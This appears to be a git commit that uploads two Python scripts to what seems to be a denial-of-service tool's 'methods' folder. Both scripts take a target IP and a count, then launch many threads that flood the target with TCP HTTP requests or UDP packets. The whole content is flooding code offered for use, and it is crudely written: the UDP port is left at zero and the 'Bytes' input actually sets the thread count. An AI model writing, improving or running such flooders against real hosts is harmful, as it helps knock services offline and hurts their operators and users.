eab1edbdf12d26ae7a255614ff6acdf39a6e6842
rxyzqc <120246386+rxyzqc@users.noreply.github.com>
2022-12-26 21:04:36 +0300

    Add files via upload

---
+++ methods/tcp.py
@@ -0,0 +1,25 @@
+import threading
+import socket
+
+ip = socket.gethostbyname(input("IP: "))
+port = int(input("Port: "))
+byte_s = int(input("Bytes: "))
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((ip, port))
+
+
+def tcp():
+    try:
+        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
+        sock.sendall(request)
+
+        print("\033[32m[+]\033[0m TCP Packet sent!")
+
+    except Exception as err:
+        print("\033[31m[-]\033[0m Connection down")
+
+
+for i in range(byte_s):
+    thread = threading.Thread(target=tcp)
+    thread.start()
---
+++ methods/udp.py
@@ -0,0 +1,21 @@
+import threading
+import socket
+
+ip = socket.gethostbyname(input("IP: "))
+byte_s = int(input("Bytes: "))
+port = int()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+
+def d_send():
+    try:
+        s.sendto(b'UDP packet', (ip, port))
+        print("\033[32m[+]\033[0mUDP Packet sent!")
+    except Exception as err:
+        print(err)
+
+
+for i in range(byte_s):
+    thread = threading.Thread(target=d_send)
+    thread.start()
